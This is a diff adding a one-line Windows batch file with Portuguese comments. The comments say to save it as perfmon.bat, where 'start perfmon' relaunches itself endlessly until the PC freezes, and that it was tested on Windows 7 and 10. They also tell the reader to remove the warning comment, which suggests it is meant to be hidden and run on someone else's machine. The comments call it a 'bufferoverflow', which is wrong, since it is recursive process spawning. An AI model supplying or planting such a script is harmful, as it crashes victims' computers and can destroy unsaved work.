@@ -1,0 +1,4 @@
+#criado com outra finalidade, porem achei interessante um pequeno "bufferoverflow" heheh,
+#Criar arquivo perfmon.bat o mesmo ira entrar em loop, testado no win 7 e 10
+#obs retirar este alerta - este comando starta em loop a chamada do perfmon, por estar com mesmo nome, levando travamento do pc)
+start perfmon
